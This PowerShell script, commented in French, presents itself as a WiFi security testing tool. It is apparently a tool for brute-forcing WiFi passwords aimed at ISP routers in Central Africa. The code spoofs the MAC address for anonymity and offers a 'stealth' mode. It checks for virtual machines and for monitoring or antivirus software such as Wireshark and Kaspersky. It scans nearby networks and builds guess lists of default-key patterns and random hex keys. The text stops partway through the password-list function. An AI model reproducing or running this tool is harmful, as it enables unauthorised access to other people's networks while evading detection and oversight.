<#
.SYNOPSIS
    WiFi Security Testing Tool - Version Cross-Platform avec anonymisation et détection de sécurité
    
.DESCRIPTION
    Outil de test de sécurité WiFi avec support Windows/Linux, MAC spoofing, 
    détection de surveillance, et mots de passe Afrique Centrale
    
.PARAMETER Mode
    Mode d'exécution: "standard", "stealth", "aggressive"
    
.PARAMETER Region
    Région cible: "central-africa", "europe", "default", "all"
    
.PARAMETER DisableMacSpoof
    Désactive le changement d'adresse MAC
    
.PARAMETER SkipSecurityCheck
    Ignore les vérifications de sécurité
    
.PARAMETER HexPasswordCount
    Nombre de mots de passe hexadécimaux à générer
    
.EXAMPLE
    .\main.ps1 -Mode stealth -Region central-africa -HexPasswordCount 10000
#>

[CmdletBinding()]
param(
    [ValidateSet("standard", "stealth", "aggressive")]
    [string]$Mode = "standard",
    
    [ValidateSet("central-africa", "europe", "default", "all")]
    [string]$Region = "central-africa",
    
    [switch]$DisableMacSpoof = $false,
    [switch]$SkipSecurityCheck = $false,
    [int]$HexPasswordCount = 5000
)

# Configuration Globale
$script:CONFIG = @{
    PasswordLength = 8
    MaxPasswords = 100000
    Interface = $null
    InterfaceGUID = $null
    ScanTimeout = 10
    ConnectionTimeout = 3
    LogDirectory = if ($PSScriptRoot) { $PSScriptRoot } else { [System.IO.Path]::GetTempPath() }
    DebugMode = $false
    HexPasswordLength = 18
    HexBatchSize = 5000
    StealthMode = ($Mode -eq "stealth")
    AggressiveMode = ($Mode -eq "aggressive")
    RegionTarget = $Region
    IsWindows = ($env:OS -eq "Windows_NT" -or $IsWindows)
    IsLinux = ($IsLinux -or ($PSVersionTable.Platform -eq "Unix"))
    IsMacOS = $IsMacOS
    OriginalMac = $null
    SpoofedMac = $null
    SecurityCheckInterval = 30
    LastSecurityCheck = [DateTime]::MinValue
}

# ============================================
# CLASSES
# ============================================

class ConnectionStateManager {
    hidden [string]$Interface
    hidden [string]$InterfaceGUID
    hidden [string]$CurrentSSID
    hidden [System.Diagnostics.Stopwatch]$Timer
    hidden [string]$LogFile
    hidden [string]$DebugFile

    ConnectionStateManager([string]$interface, [string]$interfaceGUID, [string]$logFile, [string]$debugFile) {
        $this.Interface = $interface
        $this.InterfaceGUID = $interfaceGUID
        $this.Timer = [System.Diagnostics.Stopwatch]::new()
        $this.LogFile = $logFile
        $this.DebugFile = $debugFile
    }

    [void] PrepareForTesting() {
        try {
            Write-Log "Preparing interface for testing..." "DEBUG" $this.LogFile $this.DebugFile
            
            if ($script:CONFIG.IsWindows) {
                netsh wlan disconnect interface="$($this.Interface)" 2>$null | Out-Null
            } else {
                sudo nmcli device disconnect $this.Interface 2>$null | Out-Null
            }
            Start-Sleep -Milliseconds 200
        }
        catch {
            Write-Log "Failed to prepare for testing: $_" "ERROR" $this.LogFile $this.DebugFile
        }
    }

    [void] StartTimer() {
        $this.Timer.Restart()
    }

    [timespan] GetElapsedTime() {
        return $this.Timer.Elapsed
    }

    [void] CleanupConnection() {
        try {
            Write-Log "Cleaning up connection state..." "DEBUG" $this.LogFile $this.DebugFile
            
            if ($script:CONFIG.IsWindows) {
                netsh wlan disconnect interface="$($this.Interface)" 2>$null | Out-Null
            } else {
                sudo nmcli device disconnect $this.Interface 2>$null | Out-Null
            }
        }
        catch {
            Write-Log "Cleanup error: $_" "ERROR" $this.LogFile $this.DebugFile
        }
    }
}

class ProgressTracker {
    hidden [DateTime]$StartTime
    hidden [int]$TotalPasswords
    hidden [int]$TestedPasswords
    hidden [System.Collections.Generic.List[double]]$SpeedHistory
    hidden [string]$LogFile
    hidden [string]$DebugFile
    hidden [bool]$IsComplete

    ProgressTracker([int]$total, [string]$logFile, [string]$debugFile) {
        $this.StartTime = Get-Date
        $this.TotalPasswords = $total
        $this.TestedPasswords = 0
        $this.SpeedHistory = [System.Collections.Generic.List[double]]::new()
        $this.LogFile = $logFile
        $this.DebugFile = $debugFile
        $this.IsComplete = $false
    }

    [void] UpdateProgress([string]$currentPassword) {
        $this.TestedPasswords++
        $elapsed = ([DateTime]::Now - $this.StartTime).TotalSeconds
        
        if ($elapsed -gt 0) {
            $speed = $this.TestedPasswords / $elapsed
            $this.SpeedHistory.Add($speed)
            
            if ($this.SpeedHistory.Count -gt 10) {
                $this.SpeedHistory.RemoveAt(0)
            }
        }

        $averageSpeed = ($this.SpeedHistory | Measure-Object -Average).Average
        $percentComplete = ($this.TestedPasswords / $this.TotalPasswords) * 100
        $remainingPasswords = $this.TotalPasswords - $this.TestedPasswords
        $estimatedSeconds = if ($averageSpeed -gt 0) { $remainingPasswords / $averageSpeed } else { 0 }
        $estimatedRemaining = [TimeSpan]::FromSeconds($estimatedSeconds)

        $progressParams = @{
            Activity = "Testing WiFi Passwords"
            Status = "Testing: $currentPassword"
            PercentComplete = [Math]::Min($percentComplete, 100)
            CurrentOperation = ("Speed: {0:N1} p/s | Remaining: {1:hh\:mm\:ss} | Progress: {2}/{3}" -f 
                $averageSpeed, $estimatedRemaining, $this.TestedPasswords, $this.TotalPasswords)
        }

        Write-Progress @progressParams
        Write-Log "Progress: $($this.TestedPasswords)/$($this.TotalPasswords)" "DEBUG" $this.LogFile $this.DebugFile
    }

    [void] Complete() {
        $this.IsComplete = $true
        Write-Progress -Activity "Testing WiFi Passwords" -Completed
    }

    [hashtable] GetStatistics() {
        $elapsed = ([DateTime]::Now - $this.StartTime).TotalSeconds
        $averageSpeed = ($this.SpeedHistory | Measure-Object -Average).Average

        return @{
            ElapsedTime = [TimeSpan]::FromSeconds($elapsed)
            TestedPasswords = $this.TestedPasswords
            AverageSpeed = $averageSpeed
            PercentComplete = ($this.TestedPasswords / $this.TotalPasswords) * 100
            RemainingPasswords = $this.TotalPasswords - $this.TestedPasswords
            IsComplete = $this.IsComplete
        }
    }
}

class HexPasswordGenerator {
    hidden [string]$Charset = "0123456789ABCDEF"
    hidden [int]$Length
    hidden [System.Random]$Random
    
    HexPasswordGenerator([int]$length) {
        $this.Length = $length
        $this.Random = [System.Random]::new()
    }
    
    [string] GenerateRandomHex() {
        $result = [System.Text.StringBuilder]::new($this.Length)
        for ($i = 0; $i -lt $this.Length; $i++) {
            $index = $this.Random.Next(0, 16)
            [void]$result.Append($this.Charset[$index])
        }
        return $result.ToString()
    }
    
    [System.Collections.Generic.List[string]] GenerateBatch([int]$count) {
        $batch = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
        $maxAttempts = $count * 10
        $attempts = 0
        
        while ($batch.Count -lt $count -and $attempts -lt $maxAttempts) {
            $password = $this.GenerateRandomHex()
            [void]$batch.Add($password)
            $attempts++
        }
        
        return [System.Collections.Generic.List[string]]::new($batch)
    }
}

class SecurityManager {
    hidden [string]$LogFile
    hidden [string]$DebugFile
    hidden [bool]$IsStealthMode
    
    SecurityManager([string]$logFile, [string]$debugFile, [bool]$stealthMode) {
        $this.LogFile = $logFile
        $this.DebugFile = $debugFile
        $this.IsStealthMode = $stealthMode
    }
    
    [hashtable] CheckEnvironment() {
        $results = @{
            IsSafe = $true
            Warnings = [System.Collections.Generic.List[string]]::new()
            CriticalIssues = [System.Collections.Generic.List[string]]::new()
        }
        
        try {
            # Détection VM
            $isVM = $this.DetectVirtualMachine()
            if ($isVM) {
                $results.Warnings.Add("Virtual machine detected")
                if ($this.IsStealthMode) {
                    $results.IsSafe = $false
                    $results.CriticalIssues.Add("VM detected in stealth mode")
                }
            }
            
            # Détection logiciels sécurité
            $securityProcesses = $this.DetectSecurityProcesses()
            if ($securityProcesses.Count -gt 0) {
                $results.Warnings.Add("Security software detected: $($securityProcesses -join ', ')")
            }
            
            Write-Log "Security check completed" "DEBUG" $this.LogFile $this.DebugFile
        }
        catch {
            Write-Log "Security check error: $_" "ERROR" $this.LogFile $this.DebugFile
        }
        
        return $results
    }
    
    hidden [bool] DetectVirtualMachine() {
        try {
            if ($script:CONFIG.IsWindows) {
                $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
                $manufacturer = $computerSystem.Manufacturer.ToLower()
                $model = $computerSystem.Model.ToLower()
                
                $vmIndicators = @("vmware", "virtualbox", "xen", "kvm", "hyper-v", "parallels", "qemu")
                foreach ($indicator in $vmIndicators) {
                    if ($manufacturer -like "*$indicator*" -or $model -like "*$indicator*") {
                        return $true
                    }
                }
            } else {
                $cpuinfo = Get-Content "/proc/cpuinfo" -ErrorAction SilentlyContinue
                if ($cpuinfo -match "hypervisor|vmware|kvm|qemu") { return $true }
            }
        }
        catch {
            Write-Log "VM detection error: $_" "DEBUG" $this.LogFile $this.DebugFile
        }
        return $false
    }
    
    hidden [System.Collections.Generic.List[string]] DetectSecurityProcesses() {
        $detected = [System.Collections.Generic.List[string]]::new()
        
        try {
            $securityProcessNames = @(
                "wireshark", "tcpdump", "processhacker", "procmon", 
                "fiddler", "burp", "nessus", "kaspersky", "mcafee", 
                "symantec", "norton", "avast", "avg"
            )
            
            $processes = Get-Process | Where-Object { 
                $securityProcessNames -contains $_.ProcessName.ToLower() 
            }
            
            foreach ($proc in $processes) {
                $detected.Add($proc.ProcessName)
            }
        }
        catch {
            Write-Log "Security process detection error: $_" "DEBUG" $this.LogFile $this.DebugFile
        }
        
        return $detected
    }
}

# ============================================
# FONCTIONS UTILITAIRES
# ============================================

function Write-Log {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [string]$Level = "INFO",
        [string]$LogFile,
        [string]$DebugFile
    )

    try {
        if ([string]::IsNullOrEmpty($LogFile) -or [string]::IsNullOrEmpty($DebugFile)) {
            $defaultPaths = Get-LogPaths
            $LogFile = if ($LogFile) { $LogFile } else { $defaultPaths.LogFile }
            $DebugFile = if ($DebugFile) { $DebugFile } else { $defaultPaths.DebugFile }
        }

        if ($Level -eq "DEBUG" -and -not $script:CONFIG.DebugMode) {
            return
        }

        $logDir = Split-Path $LogFile -Parent
        if (-not (Test-Path $logDir)) {
            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
        }

        $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"

        if ($Level -eq "DEBUG" -and $script:CONFIG.DebugMode) {
            Add-Content -Path $DebugFile -Value $logMessage -ErrorAction Stop
        } elseif ($Level -ne "DEBUG") {
            Add-Content -Path $LogFile -Value $logMessage -ErrorAction Stop
        }

        switch ($Level) {
            "ERROR"   { Write-Host $logMessage -ForegroundColor Red }
            "WARNING" { Write-Host $logMessage -ForegroundColor Yellow }
            "SUCCESS" { Write-Host $logMessage -ForegroundColor Green }
            default   { }
        }
    }
    catch {
        Write-Host "Logging error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Get-LogPaths {
    param([string]$SSID = "")
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $baseDir = $script:CONFIG.LogDirectory
    
    if ([string]::IsNullOrEmpty($SSID)) {
        $logDir = Join-Path $baseDir "logs"
    } else {
        $normalizedSSID = $SSID -replace '[^\w]', '_'
        $logDir = Join-Path $baseDir "logs\$normalizedSSID"
    }
    
    if (-not (Test-Path $logDir)) {
        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
    }
    
    return @{
        LogFile = Join-Path $logDir "scan_$timestamp.log"
        DebugFile = Join-Path $logDir "debug_$timestamp.log"
        PasswordFile = Join-Path $logDir "passwords_$timestamp.txt"
        SuccessFile = Join-Path $logDir "success_$timestamp.txt"
        WrongPasswordsFile = Join-Path $logDir "wrong_passwords.txt"
        Timestamp = $timestamp
    }
}

function Test-AdminRights {
    if ($script:CONFIG.IsWindows) {
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } else {
        return ((id -u) -eq 0)
    }
}

function Get-EnvironmentInfo {
    $info = @{
        OS = "Unknown"
        Version = $PSVersionTable.PSVersion.ToString()
        IsAdmin = Test-AdminRights
        PowerShellVersion = $PSVersionTable.PSVersion.Major
    }
    
    if ($script:CONFIG.IsWindows) {
        $info.OS = "Windows"
        $info.WindowsVersion = [System.Environment]::OSVersion.VersionString
    } elseif ($script:CONFIG.IsLinux) {
        $info.OS = "Linux"
        if (Test-Path "/etc/os-release") {
            $osInfo = Get-Content "/etc/os-release" | ConvertFrom-StringData
            $info.Distribution = $osInfo.PRETTY_NAME
        }
    } elseif ($script:CONFIG.IsMacOS) {
        $info.OS = "macOS"
    }
    
    return $info
}

function Set-MacAddress {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Interface,
        [string]$NewMac = $null,
        [switch]$RestoreOriginal = $false
    )
    
    $adapter = Get-NetAdapter | Where-Object Name -eq $Interface
    if (-not $adapter) {
        Write-Host "Adapter not found: $Interface" -ForegroundColor Red
        return $false
    }

    # Déterminer la MAC cible
    if ($RestoreOriginal -and $script:CONFIG.OriginalMac) {
        $targetMac = $script:CONFIG.OriginalMac
        Write-Host "Restauration de la MAC d'origine : $targetMac" -ForegroundColor Yellow
    } elseif ($NewMac) {
        $targetMac = $NewMac
    } else {
        $random = [System.Random]::new()
        $bytes = [byte[]]::new(6)
        $random.NextBytes($bytes)
        $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
        $targetMac = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
    }

    Write-Host "Tentative de changement de MAC vers : $targetMac" -ForegroundColor Cyan

    if ($script:CONFIG.IsWindows) {
        try {
            # 1. VÉRIFIER LA CLÉ DE REGISTRE AVANT DE DÉSACTIVER L'INTERFACE
            Write-Host "Recherche de la clé de registre..." -ForegroundColor Gray
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
            $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue | Where-Object { 
                $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
                $props -and $props.NetCfgInstanceId -eq $adapter.InterfaceGuid 
            }

            if (-not $subKeys) {
                throw "Impossible de trouver la clé de registre pour cet adaptateur. Votre carte réseau ne supporte peut-être pas le spoofing MAC."
            }

            # Gérer le cas où plusieurs clés sont trouvées (évite les erreurs de type Array)
            $targetKeyPath = if ($subKeys -is [array]) { $subKeys[0].PSPath } else { $subKeys.PSPath }

            # 2. DÉSACTIVER L'INTERFACE
            Write-Host "Désactivation de l'interface..." -ForegroundColor Yellow
            Disable-NetAdapter -Name $Interface -Confirm:$false
            Start-Sleep -Seconds 2

            # 3. MODIFIER LE REGISTRE
            Write-Host "Modification du registre..." -ForegroundColor Gray
            # Utilisation de New-ItemProperty -Force pour créer ou écraser la valeur de manière sécurisée
            New-ItemProperty -Path $targetKeyPath -Name "NetworkAddress" -Value $targetMac.Replace(":", "") -PropertyType String -Force -ErrorAction Stop | Out-Null
            Write-Log "Registre mis à jour avec la nouvelle MAC" "DEBUG"

            # 4. RÉACTIVER L'INTERFACE
            Write-Host "Réactivation de l'interface..." -ForegroundColor Yellow
            Enable-NetAdapter -Name $Interface -Confirm:$false

            # Attendre que l'adaptateur soit complètement up
            Write-Host "Attente de l'initialisation..." -ForegroundColor Yellow
            $timeout = 30
            $elapsed = 0
            while ($elapsed -lt $timeout) {
                Start-Sleep -Seconds 1
                $status = Get-NetAdapter -Name $Interface | Select-Object -ExpandProperty Status
                if ($status -eq "Up") {
                    Write-Host "Adaptateur prêt !" -ForegroundColor Green
                    break
                }
                $elapsed++
                Write-Host "  Attente... ($elapsed/$timeout)" -ForegroundColor Gray
            }

            if ($elapsed -ge $timeout) {
                throw "L'adaptateur n'a pas réussi à démarrer dans le délai imparti."
            }

            Start-Sleep -Seconds 3
            $script:CONFIG.SpoofedMac = $targetMac
            Write-Log "MAC changée avec succès" "SUCCESS"
            return $true

        } catch {
            Write-Log "Échec du changement de MAC : $_" "ERROR"
            Write-Host "Échec du changement de MAC. Tentative de restauration de l'interface..." -ForegroundColor Red
            
            # ==========================================
            # BLOC DE SAUVETAGE (C'EST ICI QUE TOUT SE JOUE)
            # ==========================================
            try {
                # On force la réactivation de la carte même si le registre a échoué
                Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 5
                Write-Host "Interface réactivée avec succès." -ForegroundColor Green
            } catch {
                Write-Host "CRITIQUE : Impossible de réactiver automatiquement l'adaptateur. Un redémarrage peut être nécessaire." -ForegroundColor Red
            }
            
            return $false
        }
    } else {
        # Code Linux (inchangé, il gère déjà mieux les erreurs)
        try {
            $macchanger = Get-Command macchanger -ErrorAction SilentlyContinue
            $ip = Get-Command ip -ErrorAction SilentlyContinue
            
            if ($macchanger) {
                sudo ip link set $Interface down
                Start-Sleep -Seconds 1
                sudo macchanger -m $targetMac $Interface
                sudo ip link set $Interface up
            } elseif ($ip) {
                sudo ip link set $Interface down
                Start-Sleep -Seconds 1
                sudo ip link set $Interface address $targetMac
                sudo ip link set $Interface up
            } else {
                throw "macchanger or ip command not found"
            }
            Start-Sleep -Seconds 5
            $script:CONFIG.SpoofedMac = $targetMac
            Write-Log "MAC address changed successfully" "SUCCESS"
            return $true
        } catch {
            Write-Log "Failed to change MAC: $_" "ERROR"
            return $false
        }
    }
}

function Save-OriginalMac {
    param([string]$Interface)
    
    try {
        if ($script:CONFIG.IsWindows) {
            $adapter = Get-NetAdapter | Where-Object Name -eq $Interface
            if ($adapter) {
                $script:CONFIG.OriginalMac = $adapter.MacAddress
                Write-Log "Original MAC saved: $($adapter.MacAddress)" "DEBUG"
            }
        } else {
            $mac = cat "/sys/class/net/$Interface/address" 2>$null
            if ($mac) {
                $script:CONFIG.OriginalMac = $mac.Trim()
                Write-Log "Original MAC saved: $mac" "DEBUG"
            }
        }
    }
    catch {
        Write-Log "Could not save original MAC: $_" "WARNING"
    }
}

function Select-NetworkAdapter {
    try {
        $adapters = @()
        
        if ($script:CONFIG.IsWindows) {
            $adapters = @(Get-NetAdapter | Where-Object { 
                $_.MediaType -eq "Native 802.11" -or $_.MediaType -eq "802.11"
            } | ForEach-Object {
                [PSCustomObject]@{
                    Name = $_.Name
                    Description = $_.InterfaceDescription
                    Status = $_.Status
                    MacAddress = $_.MacAddress
                    GUID = $_.InterfaceGuid
                    Index = $_.InterfaceIndex
                }
            })
        } else {
            $wirelessInterfaces = iw dev 2>$null | Select-String "Interface" | ForEach-Object { 
                ($_ -split "\s+")[1] 
            }
            
            if (-not $wirelessInterfaces) {
                $wirelessInterfaces = iwconfig 2>$null | Select-String "IEEE 802.11" | ForEach-Object { 
                    ($_ -split "\s+")[0] 
                }
            }
            
            foreach ($iface in $wirelessInterfaces) {
                $mac = cat "/sys/class/net/$iface/address" 2>$null
                $operstate = cat "/sys/class/net/$iface/operstate" 2>$null
                
                $adapters += [PSCustomObject]@{
                    Name = $iface
                    Description = "Wireless Interface"
                    Status = if ($operstate -eq "up") { "Up" } else { "Down" }
                    MacAddress = $mac.Trim()
                    GUID = $iface
                    Index = $iface
                }
            }
        }

        if ($adapters.Count -eq 0) {
            Write-Host "`nNo wireless adapters found!" -ForegroundColor Red
            return $null
        }

        Write-Host "`nAvailable Wireless Adapters:" -ForegroundColor Cyan
        for ($i = 0; $i -lt $adapters.Count; $i++) {
            $statusColor = if ($adapters[$i].Status -eq "Up") { "Green" } else { "Yellow" }
            Write-Host "[$i] $($adapters[$i].Name) - $($adapters[$i].Description) [$($adapters[$i].Status)]" -ForegroundColor $statusColor
            Write-Host "    MAC: $($adapters[$i].MacAddress)"
        }

        do {
            $selection = Read-Host "`nSelect adapter (0-$($adapters.Count - 1))"
            if ($selection -match '^\d+$' -and [int]$selection -ge 0 -and [int]$selection -lt $adapters.Count) {
                return $adapters[[int]$selection]
            }
            Write-Host "Invalid selection." -ForegroundColor Red
        } while ($true)
        
    }
    catch {
        Write-Host "Error selecting adapter: $_" -ForegroundColor Red
        return $null
    }
}

function Get-WifiNetworks {
    param(
        [string]$LogFile, 
        [string]$DebugFile
    )
    
    try {
        Write-Log "Scanning for networks..." "INFO" $LogFile $DebugFile
        
        $networks = [System.Collections.ArrayList]::new()
        
        if ($script:CONFIG.IsWindows) {
            # Forcer un scan frais
            Write-Log "Triggering WiFi scan..." "DEBUG" $LogFile $DebugFile
            
            # Désactiver/réactiver l'interface WiFi pour forcer un nouveau scan
            # netsh wlan disconnect interface="$($script:CONFIG.Interface)" 2>$null | Out-Null
            
            # Multiple tentatives de scan
            for ($attempt = 1; $attempt -le 3; $attempt++) {
                Write-Log "Scan attempt $attempt..." "DEBUG" $LogFile $DebugFile
                
                # Forcer le scan avec l'interface spécifiée
                $scanResult = netsh wlan scan interface="$($script:CONFIG.Interface)" 2>&1
                Write-Log "Scan result: $scanResult" "DEBUG" $LogFile $DebugFile
                
                Start-Sleep -Seconds 2
                
                # Récupérer les réseaux avec l'interface spécifiée
                $rawOutput = netsh wlan show networks interface="$($script:CONFIG.Interface)" mode=Bssid 2>&1
                
                if ($rawOutput -match "There are currently no networks|Aucun réseau") {
                    Write-Log "No networks found on attempt $attempt, retrying..." "WARNING" $LogFile $DebugFile
                    Start-Sleep -Seconds 3
                    continue
                }
                
                break
            }
            
            Write-Log "Raw output: $rawOutput" "DEBUG" $LogFile $DebugFile
            
            $currentNetwork = $null
            foreach ($line in $rawOutput) {
                # Ignorer les lignes d'erreur ou vides
                if ([string]::IsNullOrWhiteSpace($line) -or $line.StartsWith("Group Policy")) {
                    continue
                }
                
                if ($line -match "SSID\s+\d+\s*:\s*(.+)" -or $line -match "SSID\s*:\s*(.+)") {
                    if ($currentNetwork) { 
                        [void]$networks.Add($currentNetwork) 
                    }
                    $currentNetwork = @{
                        SSID = $matches[1].Trim()
                        Security = "Unknown"
                        Signal = 0
                        BSSID = ""
                    }
                }
                elseif ($currentNetwork) {
                    if ($line -match "Authentication\s+:\s+(.+)") {
                        $currentNetwork.Security = $matches[1].Trim()
                    }
                    elseif ($line -match "Signal\s+:\s+(\d+)") {
                        $currentNetwork.Signal = [int]$matches[1].Trim()
                    }
                    elseif ($line -match "BSSID\s+\d+\s*:\s*([0-9a-fA-F:]+)") {
                        $currentNetwork.BSSID = $matches[1].Trim()
                    }
                }
            }
            
            if ($currentNetwork) { 
                [void]$networks.Add($currentNetwork) 
            }
            
            Write-Log "Found $($networks.Count) networks" "INFO" $LogFile $DebugFile
            
        } else {
            # Linux
            $interface = $script:CONFIG.Interface
            if (-not $interface) { $interface = "wlan0" }
            
            # Tenter avec iw
            $scanOutput = sudo iw dev $interface scan 2>$null | Out-String
            
            if (-not $scanOutput) {
                # Essayer iwlist
                $scanOutput = sudo iwlist $interface scan 2>$null | Out-String
            }
            
            if ($scanOutput) {
                $cells = $scanOutput -split "BSS|Cell"
                foreach ($cell in $cells) {
                    if ($cell -match "SSID:\s*(.+)") {
                        $ssid = $matches[1].Trim()
                        
                        # Ignorer les SSID vides ou cachés
                        if ([string]::IsNullOrWhiteSpace($ssid) -or $ssid -eq "\x00") {
                            continue
                        }
                        
                        $signal = 0
                        if ($cell -match "signal:\s*(-?\d+(\.\d+)?)") {
                            $signalDbm = [decimal]$matches[1]
                            # Convertir dBm en pourcentage approximatif
                            $signal = [Math]::Min(100, [Math]::Max(0, 2 * ($signalDbm + 100)))
                        }
                        
                        [void]$networks.Add(@{
                            SSID = $ssid
                            Security = if ($cell -match "WPA3") { "WPA3" } elseif ($cell -match "WPA2") { "WPA2" } else { "WPA/WPA2" }
                            Signal = [int]$signal
                            BSSID = ""
                        })
                    }
                }
            }
        }
        
        # Filtrer les réseaux avec signal trop faible ou SSID vide
        $filteredNetworks = $networks | Where-Object { 
            $_.Signal -ge 5 -and 
            -not [string]::IsNullOrWhiteSpace($_.SSID) -and
            $_.SSID -ne "\x00"
        }
        
        Write-Log "Returning $($filteredNetworks.Count) networks after filtering" "INFO" $LogFile $DebugFile
        
        return $filteredNetworks
        
    }
    catch {
        Write-Log "Scan failed: $_" "ERROR" $LogFile $DebugFile
        Write-Log "Stack trace: $($_.ScriptStackTrace)" "DEBUG" $LogFile $DebugFile
        return $null
    }
}

function Generate-PasswordList {
    param(
        [string]$SSID,
        [string]$LogFile,
        [string]$DebugFile,
        $WrongPasswords,
        [int]$HexCount = 5000
    )
    
    Write-Log "Generating password list for region: $($script:CONFIG.RegionTarget)" "INFO" $LogFile $DebugFile
    
    $passwords = [System.Collections.Generic.List[string]]::new()
    
    # MOTS DE PASSE AFRIQUE CENTRALE
    if ($script:CONFIG.RegionTarget -eq "central-africa" -or $script:CONFIG.RegionTarget -eq "all") {
        Write-Log "Adding Central Africa specific passwords..." "DEBUG" $LogFile $DebugFile
        
       $africaPasswords = @(
            # ORANGE - Patterns hexadécimaux 18 caractères courants
            # Les Livebox Orange utilisent souvent des clés dérivées du MAC/Serial
            
            # Patterns avec MAC address (12 chars) + suffixe (6 chars)
            "A4B8C9123456789012", "A4B8C9987654321098",
            "001122334455667788", "112233445566778899",
            "0011AABBCCDDEEFF00", "1122AABBCCDDEEFF00",
            "AABBCCDDEEFF001122", "BBCCDDEEFF00112233",
            
            # Patterns communs Orange (préfixes fabricants + séquences)
            "A4B8C9ABCDEF123456", "A4B8C9FEDCBA098765",
            "001FA4B8C912345678", "001FA4B8C998765432",
            "0024D4ABCDEF123456", "0024D4FEDCBA098765",
            "001F9DABCDEF123456", "001F9DFEDCBA098765",
            
            # Séquences hex courantes Orange
            "1234567890ABCDEF01", "0987654321FEDCBA09",
            "ABCDEF1234567890AB", "FEDCBA0987654321FE",
            "0123456789ABCDEF01", "FEDCBA9876543210FE",
            
            # Patterns avec années et séquences
            "2024ABCDEF12345678", "2023ABCDEF12345678",
            "2024FEDCBA09876543", "2023FEDCBA09876543",
            
            # VODACOM - Patterns spécifiques (Afrique du Sud, RDC, etc.)
            # Les routeurs Vodacom utilisent souvent des clés 18 chars hex
            
            # Préfixes Vodacom courants (base MAC)
            "001D0FABCDEF123456", "001D0FFEDCBA098765",
            "0022CFABCDEF123456", "0022CFFEDCBA098765",
            "001E58ABCDEF123456", "001E58FEDCBA098765",
            "002147ABCDEF123456", "002147FEDCBA098765",
            "C0A0BBABCDEF123456", "C0A0BBFEDCBA098765",
            
            # Patterns séquentiels Vodacom
            "123456789012345678", "876543210987654321",
            "000000001234567890", "999999998765432109",
            "111111112345678901", "888888887654321098",
            
            # Combinations MAC-like + serial
            "AABBCCDDEEFF112233", "CCDDEEFF0011223344",
            "001122AABBCCDDEEFF", "112233AABBCCDDEEFF",
            
            # Patterns répétitifs communs
            "000000000000000000", "111111111111111111",
            "222222222222222222", "333333333333333333",
            "444444444444444444", "555555555555555555",
            "666666666666666666", "777777777777777777",
            "888888888888888888", "999999999999999999",
            "AAAAAAAAAAAAAAAAAA", "BBBBBBBBBBBBBBBBBB",
            "CCCCCCCCCCCCCCCCCC", "DDDDDDDDDDDDDDDDDD",
            "EEEEEEEEEEEEEEEEEE", "FFFFFFFFFFFFFFFFFF",
            
            # Patterns alternés
            "ABABABABABABABABAB", "CDCDCDCDCDCDCDCDCD",
            "121212121212121212", "343434343434343434",
            "565656565656565656", "787878787878787878",
            "9A9A9A9A9A9A9A9A9A", "BCBCBCBCBCBCBCBCBC",
            
            # Patterns avec préfixes pays Afrique
            # CM = Cameroun, CD = Congo/RDC, GA = Gabon, etc.
            "434D41424344454647", "4344ABCDEF12345678",  # CM, CD
            "4741ABCDEF12345678", "4346ABCDEF12345678",  # GA, CF
            
            # Clés par défaut constructeurs courants en Afrique
            # Huawei, ZTE, TP-Link utilisés par Orange/Vodacom
            
            # Huawei patterns
            "687567ABCDEF123456", "687567FEDCBA098765",
            "001E10ABCDEF123456", "001E10FEDCBA098765",
            "00259EABCDEF123456", "00259EFEDCBA098765",
            
            # ZTE patterns  
            "0019C6ABCDEF123456", "0019C6FEDCBA098765",
            "002293ABCDEF123456", "002293FEDCBA098765",
            "001E73ABCDEF123456", "001E73FEDCBA098765",
            
            # TP-Link patterns
            "001D0FABCDEF123456", "001D0FFEDCBA098765",
            "00E04CABCDEF123456", "00E04CFEDCBA098765",
            "90F652ABCDEF123456", "90F652FEDCBA098765",
            
            # Patterns numériques séquentiels
            "012345678901234567", "123456789012345678",
            "234567890123456789", "345678901234567890",
            "456789012345678901", "567890123456789012",
            "678901234567890123", "789012345678901234",
            "890123456789012345", "901234567890123456",
            
            # Patterns avec dates de fabrication
            "202401ABCDEF123456", "202402ABCDEF123456",
            "202301ABCDEF123456", "202302ABCDEF123456",
            "2024FEDCBA09876543", "2023FEDCBA09876543",
            
            # Patterns mixtes alphanumériques hex
            "ABCD1234EFAB5678CD", "EFAB5678CDAB1234EF",
            "1234ABCD5678EFAB12", "5678EFAB1234ABCD56",
            
            # Clés spécifiques box fibre Orange
            "4F52414E4745424F58",  # "ORANGEBOX" en hex
            "4C495645424F582032",  # "LIVEBOX 2" en hex
            "4C495645424F583420",  # "LIVEBOX4 " en hex
            
            # Vodacom specific hex patterns
            "564F4441434F4D2020",  # "VODACOM  " en hex
            "564444424F58574946",  # "VDDBOXWIFI" en hex partiel
            
            # Patterns de test/débogage couramment laissés
            "TEST1234567890ABCD", "TEST0987654321FEDC",
            "ADMIN1234567890ABC", "ADMIN0987654321FED",
            
            # Patterns avec séries de chiffres communs
            "000123456789ABCDEF", "999876543210FEDCBA",
            "111222333444555666", "666555444333222111",
            "123123123123123123", "321321321321321321"
        )
        
        foreach ($pass in $africaPasswords) {
            if ($pass.Length -ge 8 -and $pass.Length -le 63) {
                if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pass)) {
                    [void]$passwords.Add($pass)
                }
            }
        }
        
        # Variations avec années
        foreach ($year in 2020..2024) {
            @("mtn", "orange", "africell", "airtel") | ForEach-Object {
                [void]$passwords.Add("$_$year")
                [void]$passwords.Add("$_$($year.ToString().Substring(2))")
            }
        }
    }
    
